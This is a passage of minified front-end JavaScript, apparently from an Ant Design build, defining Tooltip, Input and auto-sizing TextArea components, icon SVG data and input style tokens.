T=t.forwardRef((e,v)=>{let{prefixCls:y,openClassName:S,getTooltipContainer:x,color:w,children:k,afterOpenChange:P,arrow:$,destroyTooltipOnHide:E,destroyOnHidden:T,title:I,overlay:R,trigger:M,builtinPlacements:A,autoAdjustOverflow:D=!0,motion:L,getPopupContainer:_,placement:O="top",mouseEnterDelay:j=.1,mouseLeaveDelay:F=.1,rootClassName:N,styles:V,classNames:B,onOpenChange:H,overlayInnerStyle:z,overlayStyle:U,overlayClassName:W,...q}=e,[,G]=(0,g.useToken)(),{getPopupContainer:J,getPrefixCls:X,direction:K,className:Q,style:Y,classNames:Z,styles:ee,arrow:et,trigger:er}=(0,m.useComponentConfig)("tooltip"),eo=(0,h.default)($,et),en=eo.show,ea=M||er||"hover";(0,d.devUseWarning)("Tooltip");let ei=t.useRef(null),es=()=>{ei.current?.forceAlign()};t.useImperativeHandle(v,()=>({forceAlign:es,nativeElement:ei.current?.nativeElement,popupElement:ei.current?.popupElement}));let[el,ec]=(0,o.useControlledState)(e.defaultOpen??!1,e.open),eu=!I&&!R&&0!==I,ed=t.useMemo(()=>A||(0,c.default)({arrowPointAtCenter:eo?.pointAtCenter??!1,autoAdjustOverflow:D,arrowWidth:en?G.sizePopupArrow:0,borderRadius:G.borderRadius,offset:G.marginXXS,visibleFirst:!0}),[eo,A,G,en,D]),ep=t.useMemo(()=>0===I?I:R||I||"",[R,I]),em=t.createElement(a.default,{space:!0,form:!0},"function"==typeof ep?ep():ep),ef={...e,trigger:ea,color:w,placement:O,builtinPlacements:A,openClassName:S,arrow:$,autoAdjustOverflow:D,getPopupContainer:_,children:k,destroyTooltipOnHide:E,destroyOnHidden:T},[eg,eh]=(0,i.useMergeSemantic)([Z,B],[ee,V],{props:ef}),ev=X("tooltip",y),eb=X(),ey=e["data-popover-inject"],eS=el;"open"in e||!eu||(eS=!1);let ex=t.isValidElement(k)&&!(0,u.isFragment)(k)?k:t.createElement("span",null,k),eC=ex.props,ew=eC.className&&"string"!=typeof eC.className?eC.className:(0,n.clsx)(eC.className,S||`${ev}-open`),ek=(0,f.default)(ev),[eP,e$]=(0,b.default)(ev,ek,!ey),eE=C(eb,ev,w),eT=eE.arrowStyle,eI=(0,n.clsx)(ek,eP,e$),eR=(0,n.clsx)(W,{[`${ev}-rtl`]:"rtl"===K},eE.className,N,eI,Q,eg.root),[eM,eA]=(0,s.useZIndex)("Tooltip",q.zIndex),eD={...eh.container,...z,...eE.overlayStyle},eL=t.createElement(r.default,{unique:!0,...q,trigger:ea,zIndex:eM,showArrow:en,placement:O,mouseEnterDelay:j,mouseLeaveDelay:F,prefixCls:ev,classNames:{root:eR,container:eg.container,arrow:eg.arrow,uniqueContainer:(0,n.clsx)(eI,eg.container)},styles:{root:{...eT,...eh.root,...Y,...U},container:eD,uniqueContainer:eD,arrow:eh.arrow},getTooltipContainer:_||x||J,ref:ei,builtinPlacements:ed,overlay:em,visible:eS,onVisibleChange:e=>{ec(!eu&&e),!eu&&H&&H(e)},afterVisibleChange:P,arrowContent:t.createElement("span",{className:`${ev}-arrow-content`}),motion:{motionName:(0,l.getTransitionName)(eb,"zoom-big-fast","string"==typeof L?.motionName?L?.motionName:void 0),motionDeadline:1e3},destroyOnHidden:T??!!E},eS?(0,u.cloneElement)(ex,{className:ew}):ex);return t.createElement(p.default.Provider,{value:eA},eL)});T._InternalPanelDoNotUseOrYouWillBeFired=e=>{let{prefixCls:r,className:o,placement:a="top",title:s,color:l,overlayInnerStyle:c,classNames:u,styles:d}=e,{getPrefixCls:p}=t.useContext(m.ConfigContext),g=p("tooltip",r),h=p(),y=(0,f.default)(g),[S,x]=(0,b.default)(g,y),w=C(h,g,l),k=w.arrowStyle,P=t.useMemo(()=>({container:{...c,...w.overlayStyle}}),[c,w.overlayStyle]),$={...e,placement:a},[E,T]=(0,i.useMergeSemantic)([u],[P,d],{props:$}),I=(0,n.clsx)(y,S,x,g,`${g}-pure`,`${g}-placement-${a}`,o,w.className);return t.createElement("div",{className:I,style:k},t.createElement("div",{className:`${g}-arrow`}),t.createElement(v.Popup,{...e,className:S,prefixCls:g,classNames:E,styles:T},s))},T.UniqueProvider=E,e.s(["default",0,T],91816);let I={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M864 170h-60c-4.4 0-8 3.6-8 8v518H310v-73c0-6.7-7.8-10.5-13-6.3l-141.9 112a8 8 0 000 12.6l141.9 112c5.3 4.2 13 .4 13-6.3v-75h498c35.3 0 64-28.7 64-64V178c0-4.4-3.6-8-8-8z"}}]},name:"enter",theme:"outlined"};var R=e.i(9583);function M(){return(M=Object.assign.bind()).apply(this,arguments)}let A=t.forwardRef((e,r)=>t.createElement(R.default,M({},e,{ref:r,icon:I})));e.s(["default",0,A],11223)},56419,53467,59422,51124,e=>{"use strict";var t=e.i(7670),r=e.i(71645);function o(e){return!!(e.addonBefore||e.addonAfter)}function n(e){return!!(e.prefix||e.suffix||e.allowClear)}function a(e,t,r){let o=t.cloneNode(!0),n=Object.create(e,{target:{value:o},currentTarget:{value:o}});return o.value=r,"number"==typeof t.selectionStart&&"number"==typeof t.selectionEnd&&(o.selectionStart=t.selectionStart,o.selectionEnd=t.selectionEnd),o.setSelectionRange=(...e)=>{t.setSelectionRange(...e)},n}function i(e,t,r,o){if(!r)return;let n=t;"click"===t.type?r(n=a(t,e,"")):"file"!==e.type&&void 0!==o?r(n=a(t,e,o)):r(n)}function s(){return(s=Object.assign.bind()).apply(this,arguments)}e.s(["hasAddon",()=>o,"hasPrefixSuffix",()=>n,"resolveOnChange",()=>i],53467);let l=r.default.forwardRef((e,a)=>{let{inputElement:i,children:l,prefixCls:c,prefix:u,suffix:d,addonBefore:p,addonAfter:m,className:f,style:g,disabled:h,readOnly:v,focused:b,triggerFocus:y,allowClear:S,value:x,handleReset:C,hidden:w,classes:k,classNames:P,dataAttrs:$,styles:E,components:T,onClear:I}=e,R=l??i,M=T?.affixWrapper||"span",A=T?.groupWrapper||"span",D=T?.wrapper||"span",L=T?.groupAddon||"span",_=(0,r.useRef)(null),O=n(e),j=(0,r.cloneElement)(R,{value:x,className:(0,t.clsx)(R.props?.className,!O&&P?.variant)||null}),F=(0,r.useRef)(null);if(r.default.useImperativeHandle(a,()=>({nativeElement:F.current||_.current})),O){let e=null;if(S){let o=!h&&!v&&x,n=`${c}-clear-icon`,a="object"==typeof S&&S?.clearIcon?S.clearIcon:"✖";e=r.default.createElement("button",{type:"button",tabIndex:-1,onClick:e=>{C?.(e),I?.()},onMouseDown:e=>e.preventDefault(),className:(0,t.clsx)(n,{[`${n}-hidden`]:!o,[`${n}-has-suffix`]:!!d})},a)}let o=`${c}-affix-wrapper`,n=(0,t.clsx)(o,{[`${c}-disabled`]:h,[`${o}-disabled`]:h,[`${o}-focused`]:b,[`${o}-readonly`]:v,[`${o}-input-with-clear-btn`]:d&&S&&x},k?.affixWrapper,P?.affixWrapper,P?.variant),a=(d||S)&&r.default.createElement("span",{className:(0,t.clsx)(`${c}-suffix`,P?.suffix),style:E?.suffix},e,d);j=r.default.createElement(M,s({className:n,style:E?.affixWrapper,onClick:e=>{_.current?.contains(e.target)&&y?.()}},$?.affixWrapper,{ref:_}),u&&r.default.createElement("span",{className:(0,t.clsx)(`${c}-prefix`,P?.prefix),style:E?.prefix},u),j,a)}if(o(e)){let e=`${c}-group`,o=`${e}-addon`,n=`${e}-wrapper`,a=(0,t.clsx)(`${c}-wrapper`,e,k?.wrapper,P?.wrapper),i=(0,t.clsx)(n,{[`${n}-disabled`]:h},k?.group,P?.groupWrapper);j=r.default.createElement(A,{className:i,ref:F},r.default.createElement(D,{className:a},p&&r.default.createElement(L,{className:o},p),j,m&&r.default.createElement(L,{className:o},m)))}return r.default.cloneElement(j,{className:(0,t.clsx)(j.props?.className,f)||null,style:{...j.props?.style,...g},hidden:w})});e.s(["default",0,l],59422);var c=e.i(40383),u=e.i(80573);function d(e,t){return r.useMemo(()=>{let r={};t&&(r.show="object"==typeof t&&t.formatter?t.formatter:!!t);let{show:o,...n}=r={...r,...e};return{...n,show:!!o,showFormatter:"function"==typeof o?o:void 0,strategy:n.strategy||(e=>e.length)}},[e,t])}e.s(["default",()=>d],51124);var p=e.i(63611);function m(){return(m=Object.assign.bind()).apply(this,arguments)}let f=(0,r.forwardRef)((e,o)=>{let n,{autoComplete:a,onChange:s,onFocus:f,onBlur:g,onPressEnter:h,onKeyDown:v,onKeyUp:b,prefixCls:y="rc-input",disabled:S,htmlSize:x,className:C,maxLength:w,suffix:k,showCount:P,count:$,type:E="text",classes:T,classNames:I,styles:R,onCompositionStart:M,onCompositionEnd:A,...D}=e,[L,_]=(0,r.useState)(!1),O=(0,r.useRef)(!1),j=(0,r.useRef)(!1),F=(0,r.useRef)(null),N=(0,r.useRef)(null),V=e=>{F.current&&(0,p.triggerFocus)(F.current,e)},[B,H]=(0,c.default)(e.defaultValue,e.value),z=null==B?"":String(B),[U,W]=(0,r.useState)(null),q=d($,P),G=q.max||w,J=q.strategy(z),X=!!G&&J>G;(0,r.useImperativeHandle)(o,()=>({focus:V,blur:()=>{F.current?.blur()},setSelectionRange:(e,t,r)=>{F.current?.setSelectionRange(e,t,r)},select:()=>{F.current?.select()},input:F.current,nativeElement:N.current?.nativeElement||F.current})),(0,r.useEffect)(()=>{j.current&&(j.current=!1),_(e=>(!e||!S)&&e)},[S]);let K=(e,t,r)=>{let o=t;if(!O.current&&q.exceedFormatter&&q.max&&q.strategy(t)>q.max)o=q.exceedFormatter(t,{max:q.max}),t!==o&&W([F.current?.selectionStart||0,F.current?.selectionEnd||0]);else if("compositionEnd"===r.source)return;H(o),F.current&&i(F.current,e,s,o)};(0,r.useEffect)(()=>{U&&F.current?.setSelectionRange(...U)},[U]);let Q=X&&`${y}-out-of-range`;return r.default.createElement(l,m({},D,{prefixCls:y,className:(0,t.clsx)(C,Q),handleReset:e=>{H(""),V(),F.current&&i(F.current,e,s)},value:z,focused:L,triggerFocus:V,suffix:(()=>{let e=Number(G)>0;if(k||q.show){let o=q.showFormatter?q.showFormatter({value:z,count:J,maxLength:G}):`${J}${e?` / ${G}`:""}`;return r.default.createElement(r.default.Fragment,null,q.show&&r.default.createElement("span",{className:(0,t.clsx)(`${y}-show-count-suffix`,{[`${y}-show-count-has-suffix`]:!!k},I?.count),style:{...R?.count}},o),k)}return null})(),disabled:S,classes:T,classNames:I,styles:R,ref:N}),(n=(0,u.default)(e,["prefixCls","onPressEnter","addonBefore","addonAfter","prefix","suffix","allowClear","defaultValue","showCount","count","classes","htmlSize","styles","classNames","onClear"]),r.default.createElement("input",m({autoComplete:a},n,{onChange:e=>{K(e,e.target.value,{source:"change"})},onFocus:e=>{_(!0),f?.(e)},onBlur:e=>{j.current&&(j.current=!1),_(!1),g?.(e)},onKeyDown:e=>{!h||"Enter"!==e.key||j.current||e.nativeEvent.isComposing||(j.current=!0,h(e)),v?.(e)},onKeyUp:e=>{"Enter"===e.key&&(j.current=!1),b?.(e)},className:(0,t.clsx)(y,{[`${y}-disabled`]:S},I?.input),style:R?.input,ref:F,size:x,type:E,onCompositionStart:e=>{O.current=!0,M?.(e)},onCompositionEnd:e=>{O.current=!1,K(e,e.currentTarget.value,{source:"compositionEnd"}),A?.(e)}}))))});e.s(["default",0,f],56419)},63651,e=>{"use strict";let t;e.i(56419);var r=e.i(59422),r=r,o=e.i(51124),n=e.i(53467),a=e.i(40383),i=e.i(7670),s=e.i(71645);e.i(47167);var l=e.i(78052),c=e.i(1676),u=e.i(37434);let d=`
  min-height:0 !important;
  max-height:none !important;
  height:0 !important;
  visibility:hidden !important;
  overflow:hidden !important;
  position:absolute !important;
  z-index:-1000 !important;
  top:0 !important;
  right:0 !important;
  pointer-events: none !important;
`,p=["letter-spacing","line-height","padding-top","padding-bottom","font-family","font-weight","font-size","font-variant","text-rendering","text-transform","width","text-indent","padding-left","padding-right","border-width","box-sizing","word-break","white-space"],m={};function f(){return(f=Object.assign.bind()).apply(this,arguments)}let g=s.forwardRef((e,r)=>{let{prefixCls:o,defaultValue:n,value:g,autoSize:h,onResize:v,className:b,style:y,disabled:S,onChange:x,onInternalAutoSize:C,...w}=e,[k,P]=(0,a.default)(n,g),$=s.useRef();s.useImperativeHandle(r,()=>({textArea:$.current}));let[E,T]=s.useMemo(()=>h&&"object"==typeof h?[h.minRows,h.maxRows]:[],[h]),I=!!h,[R,M]=s.useState(2),[A,D]=s.useState(),L=()=>{M(0)};(0,c.default)(()=>{I&&L()},[g,E,T,I]),(0,c.default)(()=>{if(0===R)M(1);else if(1===R){let e=function(e,r=!1,o=null,n=null){let a,i,s;t||((t=document.createElement("textarea")).setAttribute("tab-index","-1"),t.setAttribute("aria-hidden","true"),t.setAttribute("name","hiddenTextarea"),document.body.appendChild(t)),e.getAttribute("wrap")?t.setAttribute("wrap",e.getAttribute("wrap")):t.removeAttribute("wrap");let{paddingSize:l,borderSize:c,boxSizing:u,sizingStyle:f}=function(e,t=!1){let r=e.getAttribute("id")||e.getAttribute("data-reactid")||e.getAttribute("name");if(t&&m[r])return m[r];let o=window.getComputedStyle(e),n=o.getPropertyValue("box-sizing")||o.getPropertyValue("-moz-box-sizing")||o.getPropertyValue("-webkit-box-sizing"),a=parseFloat(o.getPropertyValue("padding-bottom"))+parseFloat(o.getPropertyValue("padding-top")),i=parseFloat(o.getPropertyValue("border-bottom-width"))+parseFloat(o.getPropertyValue("border-top-width")),s={sizingStyle:p.map(e=>`${e}:${o.getPropertyValue(e)}`).join(";"),paddingSize:a,borderSize:i,boxSizing:n};return t&&r&&(m[r]=s),s}(e,r);t.setAttribute("style",`${f};${d}`),t.value=e.value||e.placeholder||"";let g=t.scrollHeight;if("border-box"===u?g+=c:"content-box"===u&&(g-=l),null!==o||null!==n){t.value=" ";let e=t.scrollHeight-l;null!==o&&(i=e*o,"border-box"===u&&(i=i+l+c),g=Math.max(i,g)),null!==n&&(s=e*n,"border-box"===u&&(s=s+l+c),a=g>s?"":"hidden",g=Math.min(s,g))}let h={height:g,overflowY:a,resize:"none"};return i&&(h.minHeight=i),s&&(h.maxHeight=s),h}($.current,!1,E,T);M(2),D(e)}},[R]);let _=s.useRef(),O=()=>{u.default.cancel(_.current)};s.useEffect(()=>O,[]);let j={...y,...I?A:null};return(0===R||1===R)&&(j.overflowY="hidden",j.overflowX="hidden"),s.createElement(l.default,{onResize:e=>{2===R&&(v?.(e),h&&(O(),_.current=(0,u.default)(()=>{L()})))},disabled:!(h||v)},s.createElement("textarea",f({},w,{ref:$,style:j,className:(0,i.clsx)(o,b,{[`${o}-disabled`]:S}),disabled:S,value:k??"",onChange:e=>{P(e.target.value),x?.(e)}})))});function h(){return(h=Object.assign.bind()).apply(this,arguments)}let v=s.default.forwardRef(({defaultValue:e,value:t,onFocus:l,onBlur:c,onChange:u,allowClear:d,maxLength:p,onCompositionStart:m,onCompositionEnd:f,suffix:v,prefixCls:b="rc-textarea",showCount:y,count:S,className:x,style:C,disabled:w,hidden:k,classNames:P,styles:$,onResize:E,onClear:T,onPressEnter:I,readOnly:R,autoSize:M,onKeyDown:A,...D},L)=>{let _,[O,j]=(0,a.default)(e,t),F=null==O?"":String(O),[N,V]=s.default.useState(!1),B=s.default.useRef(!1),[H,z]=s.default.useState(null),U=(0,s.useRef)(null),W=(0,s.useRef)(null),q=()=>W.current?.textArea,G=()=>{q().focus()};(0,s.useImperativeHandle)(L,()=>({resizableTextArea:W.current,focus:G,blur:()=>{q().blur()},nativeElement:U.current?.nativeElement||q()})),(0,s.useEffect)(()=>{V(e=>!w&&e)},[w]);let[J,X]=s.default.useState(null);s.default.useEffect(()=>{J&&q().setSelectionRange(...J)},[J]);let K=(0,o.default)(S,y),Q=K.max??p,Y=Number(Q)>0,Z=K.strategy(F),ee=!!Q&&Z>Q,et=(e,t)=>{let r=t;!B.current&&K.exceedFormatter&&K.max&&K.strategy(t)>K.max&&(r=K.exceedFormatter(t,{max:K.max}),t!==r&&X([q().selectionStart||0,q().selectionEnd||0])),j(r),(0,n.resolveOnChange)(e.currentTarget,e,u,r)},er=v;K.show&&(_=K.showFormatter?K.showFormatter({value:F,count:Z,maxLength:Q}):`${Z}${Y?` / ${Q}`:""}`,er=s.default.createElement(s.default.Fragment,null,er,s.default.createElement("span",{className:(0,i.clsx)(`${b}-data-count`,P?.count),style:$?.count},_)));let eo=!M&&!y&&!d;return s.default.createElement(r.default,{ref:U,value:F,allowClear:d,handleReset:e=>{j(""),G(),(0,n.resolveOnChange)(q(),e,u)},suffix:er,prefixCls:b,classNames:{...P,affixWrapper:(0,i.clsx)(P?.affixWrapper,{[`${b}-show-count`]:y,[`${b}-textarea-allow-clear`]:d})},disabled:w,focused:N,className:(0,i.clsx)(x,ee&&`${b}-out-of-range`),style:{...C,...H&&!eo?{height:"auto"}:{}},dataAttrs:{affixWrapper:{"data-count":"string"==typeof _?_:void 0}},hidden:k,readOnly:R,onClear:T},s.default.createElement(g,h({},D,{autoSize:M,maxLength:p,onKeyDown:e=>{"Enter"===e.key&&I&&!e.nativeEvent.isComposing&&I(e),A?.(e)},onChange:e=>{et(e,e.target.value)},onFocus:e=>{V(!0),l?.(e)},onBlur:e=>{V(!1),c?.(e)},onCompositionStart:e=>{B.current=!0,m?.(e)},onCompositionEnd:e=>{B.current=!1,et(e,e.currentTarget.value),f?.(e)},className:(0,i.clsx)(P?.textarea),style:{resize:C?.resize,...$?.textarea},disabled:w,prefixCls:b,onResize:e=>{E?.(e),q()?.style.height&&z(!0)},ref:W,readOnly:R})))});e.s(["default",0,v],63651)},30683,e=>{"use strict";var t=e.i(71645);e.i(47167);let r={icon:{tag:"svg",attrs:{"fill-rule":"evenodd",viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64c247.4 0 448 200.6 448 448S759.4 960 512 960 64 759.4 64 512 264.6 64 512 64zm127.98 274.82h-.04l-.08.06L512 466.75 384.14 338.88c-.04-.05-.06-.06-.08-.06a.12.12 0 00-.07 0c-.03 0-.05.01-.09.05l-45.02 45.02a.2.2 0 00-.05.09.12.12 0 000 .07v.02a.27.27 0 00.06.06L466.75 512 338.88 639.86c-.05.04-.06.06-.06.08a.12.12 0 000 .07c0 .03.01.05.05.09l45.02 45.02a.2.2 0 00.09.05.12.12 0 00.07 0c.02 0 .04-.01.08-.05L512 557.25l127.86 127.87c.04.04.06.05.08.05a.12.12 0 00.07 0c.03 0 .05-.01.09-.05l45.02-45.02a.2.2 0 00.05-.09.12.12 0 000-.07v-.02a.27.27 0 00-.05-.06L557.25 512l127.87-127.86c.04-.04.05-.06.05-.08a.12.12 0 000-.07c0-.03-.01-.05-.05-.09l-45.02-45.02a.2.2 0 00-.09-.05.12.12 0 00-.07 0z"}}]},name:"close-circle",theme:"filled"};var o=e.i(9583);function n(){return(n=Object.assign.bind()).apply(this,arguments)}let a=t.forwardRef((e,a)=>t.createElement(o.default,n({},e,{ref:a,icon:r})));e.s(["default",0,e=>{let r;return"object"==typeof e&&e?.clearIcon?r=e:e&&(r={clearIcon:t.default.createElement(a,null)}),r}],30683)},52956,17458,49942,e=>{"use strict";var t=e.i(7670);e.s(["getMergedStatus",0,(e,t)=>t||e,"getStatusClassNames",0,(e,r,o)=>(0,t.clsx)({[`${e}-status-success`]:"success"===r,[`${e}-status-warning`]:"warning"===r,[`${e}-status-error`]:"error"===r,[`${e}-status-validating`]:"validating"===r,[`${e}-has-feedback`]:o})],52956),e.i(96059);var r=e.i(15654),o=e.i(83293),n=e.i(72409),a=e.i(46422),i=e.i(38378);function s(e){return(0,i.mergeToken)(e,{inputAffixPadding:e.paddingXXS})}let l=e=>{let{controlHeight:t,fontSize:r,lineHeight:o,lineWidth:n,controlHeightSM:a,controlHeightLG:i,fontSizeLG:s,lineHeightLG:l,paddingSM:c,controlPaddingHorizontalSM:u,controlPaddingHorizontal:d,colorFillAlter:p,colorPrimaryHover:m,colorPrimary:f,controlOutlineWidth:g,controlOutline:h,colorErrorOutline:v,colorWarningOutline:b,colorBgContainer:y,inputFontSize:S,inputFontSizeLG:x,inputFontSizeSM:C}=e,w=S||r,k=C||w,P=x||s;return{paddingBlock:Math.max(Math.round((t-w*o)/2*10)/10-n,0),paddingBlockSM:Math.max(Math.round((a-k*o)/2*10)/10-n,0),paddingBlockLG:Math.max(Math.ceil((i-P*l)/2*10)/10-n,0),paddingInline:c-n,paddingInlineSM:u-n,paddingInlineLG:d-n,addonBg:p,activeBorderColor:f,hoverBorderColor:m,activeShadow:`0 0 0 ${g}px ${h}`,errorActiveShadow:`0 0 0 ${g}px ${v}`,warningActiveShadow:`0 0 0 ${g}px ${b}`,hoverBg:y,activeBg:y,inputFontSize:w,inputFontSizeLG:P,inputFontSizeSM:k}};e.s(["initComponentToken",0,l,"initInputToken",()=>s],17458);let c=e=>{let t;return{color:e.colorTextDisabled,backgroundColor:e.colorBgContainerDisabled,borderColor:e.colorBorder,boxShadow:"none",cursor:"not-allowed",opacity:1,"input[disabled], textarea[disabled]":{cursor:"not-allowed"},"&:hover:not([disabled])":{...{borderColor:(t=(0,i.mergeToken)(e,{hoverBorderColor:e.colorBorder,hoverBg:e.colorBgContainerDisabled})).hoverBorderColor,backgroundColor:t.hoverBg}}}},u=(e,t)=>({background:e.colorBgContainer,borderWidth:e.lineWidth,borderStyle:e.lineType,borderColor:t.borderColor,"&:hover":{borderColor:t.hoverBorderColor,backgroundColor:e.hoverBg},"&:focus, &:focus-within":{borderColor:t.activeBorderColor,boxShadow:t.activeShadow,outline:0,backgroundColor:e.activeBg}}),d=(e,t)=>({[`&${e.componentCls}-status-${t.status}:not(${e.componentCls}-disabled)`]:{...u(e,t),[`${e.componentCls}-prefix, ${e.componentCls}-suffix`]:{color:t.affixColor}},[`&${e.componentCls}-status-${t.status}${e.componentCls}-disabled`]:{borderColor:t.borderColor}}),p=(e,t)=>({[`&${e.componentCls}-group-wrapper-status-${t.status}`]:{[`${e.componentCls}-group-addon`]:{borderColor:t.addonBorderColor,color:t.addonColor}}}),m=(e,t)=>({background:t.bg,borderWidth:e.lineWidth,borderStyle:e.lineType,borderColor:"transparent","input&, & input, textarea&, & textarea":{color:t?.inputColor??"unset"},"&:hover":{background:t.hoverBg},"&:focus, &:focus-within":{outline:0,borderColor:t.activeBorderColor,backgroundColor:e.activeBg}}),f=(e,t)=>({[`&${e.componentCls}-status-${t.status}:not(${e.componentCls}-disabled)`]:{...m(e,t),[`${e.componentCls}-prefix, ${e.componentCls}-suffix`]:{color:t.affixColor}}}),g=(e,t)=>({[`&${e.componentCls}-group-wrapper-status-${t.status}`]:{[`${e.componentCls}-group-addon`]:{background:t.addonBg,color:t.addonColor}}}),h=(e,t)=>({background:e.colorBgContainer,borderWidth:`${(0,r.unit)(e.lineWidth)} 0`,borderStyle:`${e.lineType} none`,borderColor:`transparent transparent ${t.borderColor} transparent`,borderRadius:0,"&:hover":{borderColor:`transparent transparent ${t.hoverBorderColor} transparent`,backgroundColor:e.hoverBg},"&:focus, &:focus-within":{borderColor:`transparent transparent ${t.activeBorderColor} transparent`,outline:0,backgroundColor:e.activeBg}}),v=(e,t)=>({[`&${e.componentCls}-status-${t.status}:not(${e.componentCls}-disabled)`]:{...h(e,t),[`${e.componentCls}-prefix, ${e.componentCls}-suffix`]:{color:t.affixColor}},[`&${e.componentCls}-status-${t.status}${e.componentCls}-disabled`]:{borderColor:`transparent transparent ${t.borderColor} transparent`}}),b=e=>{let{paddingBlockLG:t,lineHeightLG:o,borderRadiusLG:n,paddingInlineLG:a}=e;return{padding:`${(0,r.unit)(t)} ${(0,r.unit)(a)}`,fontSize:e.inputFontSizeLG,lineHeight:o,borderRadius:n}},y=e=>({padding:`${(0,r.unit)(e.paddingBlockSM)} ${(0,r.unit)(e.paddingInlineSM)}`,fontSize:e.inputFontSizeSM,borderRadius:e.borderRadiusSM}),S=(e,t={})=>({position:"relative",display:"inline-block",width:"100%",minWidth:0,padding:`${(0,r.unit)(e.paddingBlock)} ${(0,r.unit)(e.paddingInline)}`,color:e.colorText,fontSize:e.inputFontSize,lineHeight:e.lineHeight,borderRadius:e.borderRadius,transition:`all ${e.motionDurationMid}`,...{"&::-moz-placeholder":{opacity:1},"&::placeholder":{color:e.colorTextPlaceholder,userSelect:"none"},"&:placeholder-shown":{textOverflow:"ellipsis"}},"&-lg":{...b(e),...t.largeStyle},"&-sm":{...y(e),...t.smallStyle},"&-rtl, &-textarea-rtl":{direction:"rtl"}}),x=(0,a.genStyleHooks)(["Input","Shared"],e=>{let t=(0,i.mergeToken)(e,s(e));return[(e=>{let t,r,n,{componentCls:a,controlHeightSM:i,lineWidth:s,calc:l}=e,p=l(i).sub(l(s).mul(2)).sub(16).div(2).equal();return{[a]:{...(0,o.resetComponent)(e),...S(e),...{"&-outlined":{...u(e,{borderColor:e.colorBorder,hoverBorderColor:e.hoverBorderColor,activeBorderColor:e.activeBorderColor,activeShadow:e.activeShadow}),[`&${e.componentCls}-disabled, &[disabled]`]:{...c(e)},...d(e,{status:"error",borderColor:e.colorError,hoverBorderColor:e.colorErrorBorderHover,activeBorderColor:e.colorError,activeShadow:e.errorActiveShadow,affixColor:e.colorError}),...d(e,{status:"warning",borderColor:e.colorWarning,hoverBorderColor:e.colorWarningBorderHover,activeBorderColor:e.colorWarning,activeShadow:e.warningActiveShadow,affixColor:e.colorWarning}),...t}},...{"&-filled":{...m(e,{bg:e.colorFillTertiary,hoverBg:e.colorFillSecondary,activeBorderColor:e.activeBorderColor,inputColor:e.colorText}),[`&${e.componentCls}-disabled, &[disabled]`]:{...c(e)},...f(e,{status:"error",bg:e.colorErrorBg,hoverBg:e.colorErrorBgHover,activeBorderColor:e.colorError,inputColor:e.colorErrorText,affixColor:e.colorError}),...f(e,{status:"warning",bg:e.colorWarningBg,hoverBg:e.colorWarningBgHover,activeBorderColor:e.colorWarning,inputColor:e.colorWarningText,affixColor:e.colorWarning}),...r}},...((e,t)=>{let{componentCls:r}=e;return{"&-borderless":{background:"transparent",border:"none",paddingBlock:e.calc(e.paddingBlock).add(e.lineWidth).equal(),[`&${r}-sm, &${r}-affix-wrapper-sm`]:{paddingBlock:e.calc(e.paddingBlockSM).add(e.lineWidth).equal()},[`&${r}-lg, &${r}-affix-wrapper-lg`]:{paddingBlock:e.calc(e.paddingBlockLG).add(e.lineWidth).equal()},"&:focus, &:focus-within":{outline:"none"},[`&${r}-disabled, &[disabled]`]:{color:e.colorTextDisabled,cursor:"not-allowed"},[`&${r}-status-error`]:{"&, & input, & textarea":{color:e.colorError}},[`&${r}-status-warning`]:{"&, & input, & textarea":{color:e.colorWarning}},...t}}})(e),...{"&-underlined":{...h(e,{borderColor:e.colorBorder,hoverBorderColor:e.hoverBorderColor,activeBorderColor:e.activeBorderColor,activeShadow:e.activeShadow}),[`&${e.componentCls}-disabled, &[disabled]`]:{color:e.colorTextDisabled,boxShadow:"none",cursor:"not-allowed","&:hover":{borderColor:`transparent transparent ${e.colorBorder} transparent`}},"input[disabled], textarea[disabled]":{cursor:"not-allowed"},...v(e,{status:"error",borderColor:e.colorError,hoverBorderColor:e.colorErrorBorderHover,activeBorderColor:e.colorError,activeShadow:e.errorActiveShadow,affixColor:e.colorError}),...v(e,{status:"warning",borderColor:e.colorWarning,hoverBorderColor:e.colorWarningBorderHover,activeBorderColor:e.colorWarning,activeShadow:e.warningActiveShadow,affixColor:e.colorWarning}),...n}},'&[type="color"]':{height:e.controlHeight,[`&${a}-lg`]:{height:e.controlHeightLG},[`&${a}-sm`]:{height:i,paddingTop:p,paddingBottom:p}},'&[type="search"]::-webkit-search-cancel-button, &[type="search"]::-webkit-search-decoration':{appearance:"none"}}}})(t),(e=>{let{componentCls:t,inputAffixPadding:o,colorTextDescription:n,motionDurationSlow:a,colorIcon:i,colorIconHover:s,iconCls:l}=e,c=`${t}-affix-wrapper`,u=`${t}-affix-wrapper-disabled`;return{[c]:{...S(e),display:"inline-flex","&-focused, &:focus":{zIndex:1},[`> input${t}`]:{padding:0},[`> input${t}, > textarea${t}`]:{fontSize:"inherit",border:"none",borderRadius:0,outline:"none",background:"transparent",color:"inherit","&::-ms-reveal":{display:"none"},"&:focus":{boxShadow:"none !important"}},"&::before":{display:"inline-block",width:0,visibility:"hidden",content:'"\\a0"'},[t]:{"&-prefix, &-suffix":{display:"flex",flex:"none",alignItems:"center","> *:not(:last-child)":{marginInlineEnd:e.paddingXS}},"&-show-count-suffix":{color:n,direction:"ltr"},"&-show-count-has-suffix":{marginInlineEnd:e.paddingXXS},"&-prefix":{marginInlineEnd:o},"&-suffix":{marginInlineStart:o}},...(e=>{let{componentCls:t}=e;return{[`${t}-clear-icon`]:{margin:0,padding:0,lineHeight:0,color:e.colorTextQuaternary,fontSize:e.fontSizeIcon,verticalAlign:-1,cursor:"pointer",transition:`color ${e.motionDurationSlow}`,border:"none",outline:"none",backgroundColor:"transparent","&:hover":{color:e.colorIcon},"&:active":{color:e.colorText},"&-hidden":{visibility:"hidden"},"&-has-suffix":{margin:`0 ${(0,r.unit)(e.inputAffixPadding)}`}}}})(e),[`${l}${t}-password-icon`]:{color:i,cursor:"pointer",transition:`all ${a}`,"&:hover":{color:s}}},[`${t}-underlined`]:{borderRadius:0},[u]:{[`${l}${t}-password-icon`]:{color:i,cursor:"not-allowed","&:hover":{color:i}}}}})(t)]},l,{resetFont:!1}),C=(0,a.genStyleHooks)(["Input","Component"],e=>{let 